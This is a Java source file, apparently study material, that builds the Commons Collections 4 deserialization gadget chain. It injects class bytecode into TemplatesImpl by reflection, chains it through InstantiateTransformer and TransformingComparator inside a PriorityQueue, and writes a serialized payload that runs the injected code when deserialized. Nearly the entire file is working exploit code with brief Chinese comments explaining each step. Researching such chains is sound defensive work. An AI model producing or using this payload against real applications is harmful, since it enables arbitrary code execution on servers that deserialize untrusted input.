package CommonsCollections4;
// commons.collections4环境下的利用，PriorityQueue链
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        TemplatesImpl templates = new TemplatesImpl();
        Class c = TemplatesImpl.class;
        // 设置_name不为空
        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");
        // 定义字节码，反射修改_bytecodes的值
        byte[] code = Files.readAllBytes(Paths.get("D:\\04\\target\\classes\\outCalc.class"));
        byte[][] codes = {code};
        Field bytecodesField = c.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates,codes);
        // _tfactory赋值
        Field tfactoryField = c.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        TransformingComparator transformingComparator = new TransformingComparator((Transformer) instantiateTransformer);

//        transformingComparator.compare(templates,null);
        PriorityQueue priorityQueue = new PriorityQueue(4,  transformingComparator);

        Class c2 = PriorityQueue.class;
        Field size = c2.getDeclaredField("size");
        size.setAccessible(true);
        size.set(priorityQueue,4);
//        priorityQueue.add(Runtime.class);

        Field queueField = c2.getDeclaredField("queue");
        queueField.setAccessible(true);
        queueField.set(priorityQueue,new Object[]{1, TrAXFilter.class,2,3});
        serialize(priorityQueue);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}
